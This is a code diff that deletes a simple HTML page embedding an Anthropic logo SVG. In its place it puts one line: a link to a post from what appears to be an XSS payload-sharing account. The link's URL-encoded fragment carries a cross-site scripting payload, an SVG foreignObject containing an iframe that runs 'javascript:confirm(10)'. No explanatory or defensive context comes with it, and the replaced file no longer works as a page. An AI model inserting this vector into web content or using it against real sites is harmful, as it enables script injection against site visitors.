@@ -1,13 +1,1 @@
-<!DOCTYPE html>
-<html>
-<head>
-  <title>SVG Image from File</title>
-</head>
-<body>
-  <h1>Embedding an SVG Image from a File</h1>
-  <p>This page includes an SVG image of the Anthropic logo from an external file:</p>
-  <a href="https://www.anthropic.com">
-    <img src="anthropic_logo.svg" alt="Anthropic Logo" width="200" height="200">
-  </a>
-</body>
-</html>
+https://x.com/XssPayloads/status/1773945831952900587#:~:text=%3Csvg%3E%20%3CforeignObject%20width%3D%22100%25%22%20height%3D%22100%25%22%3E%20%20%20%20%20%3Cbody%3E%20%3Ciframe%20src%3D%27javascript%3Aconfirm(10)%27%3E%3C/iframe%3E%20%20%20%20%20%3C/body%3E%20%20%20%3C/foreignObject%3E%20%3C/svg%3E
